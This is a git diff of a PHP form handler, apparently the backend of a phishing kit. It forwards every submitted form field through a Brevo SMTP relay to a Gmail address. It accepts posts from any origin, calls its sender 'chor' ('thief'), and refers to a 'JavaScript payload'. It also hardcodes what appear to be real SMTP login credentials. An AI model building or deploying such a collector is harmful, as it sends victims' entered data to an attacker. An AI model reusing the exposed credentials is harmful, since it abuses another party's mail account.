@@ -1,58 +1,54 @@
 <?php
+// Wasmer par maujood send_logic.php
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
-
-header("Location: https://fdfdfdcvxc.wasmer.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
 require 'SMTP.php';
 
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Initialize an empty body for the email
-    $emailBody = '';
+header("Access-Control-Allow-Origin: *");
+header("Access-Control-Allow-Methods: POST");
 
-    // Iterate through the $_POST array to collect form data
-    foreach ($_POST as $key => $value) {
-        // Append form field name and its value to the email body
-        $emailBody .= ucfirst($key) . ': ' . $value . '<br>';
-    }
-
-
-
-    // PHPMailer object creation
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $mail = new PHPMailer(true);
+
     try {
-        // SMTP settings
+        // Brevo SMTP Settings
         $mail->isSMTP();
-        $mail->Host       = 'smtp-relay.brevo.com'; // Replace with your SMTP server address
+        $mail->Host       = 'smtp-relay.brevo.com';
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'ab2b68001@smtp-brevo.com'; // Replace with your email address
-        $mail->Password   = 'bsknvfTPYzK3DVt'; // Replace with your email password
-        $mail->SMTPSecure = 'tls';
+        $mail->Username   = 'ab2b68001@smtp-brevo.com'; 
+        $mail->Password   = 'bsknvfTPYzK3DVt'; 
         $mail->Port       = 587;
+        $mail->SMTPSecure = 'tls'; 
 
+        // Sender & Receiver
+        $mail->setFrom('arzajejo@arzajejo.xyz', 'Arzajejo Form');
+        $mail->addAddress('alibrohi883@gmail.com'); 
 
-        // Email properties
-        $mail->setFrom('arzajejo@arzajejo.xyz', 'chor');
-        $mail->addAddress('progemni7@gmail.com');
-       
-
-
-      // Email recipient's address
-
-        // Email content
+        // Content
         $mail->isHTML(true);
-        $mail->Subject = 'name';
-        $mail->Body = $emailBody; // Set the email body using the collected form data
+        $mail->Subject = 'New Form Submission via Hex Endpoint';
+        
+        // Data build karna
+        $message_body = "<h3>New Form Data Received:</h3>";
+        if (!empty($_POST)) {
+            foreach ($_POST as $key => $value) {
+                $message_body .= "<b>" . ucfirst($key) . ":</b> " . htmlspecialchars($value) . "<br>";
+            }
+        } else {
+            $message_body .= "No data fields captured. Check JavaScript payload.";
+        }
 
-        // Send email
+        $mail->Body = $message_body;
+
         $mail->send();
-        echo 'Email successfully sent using PHPMailer.';
+        echo "success"; // JavaScript ko success response milega
     } catch (Exception $e) {
-        echo "Email sending failed. Error message: {$mail->ErrorInfo}";
+        echo "Mailer Error: " . $mail->ErrorInfo;
     }
 } else {
-    echo "Invalid request!";
+    echo "Direct access not allowed.";
 }
 ?>
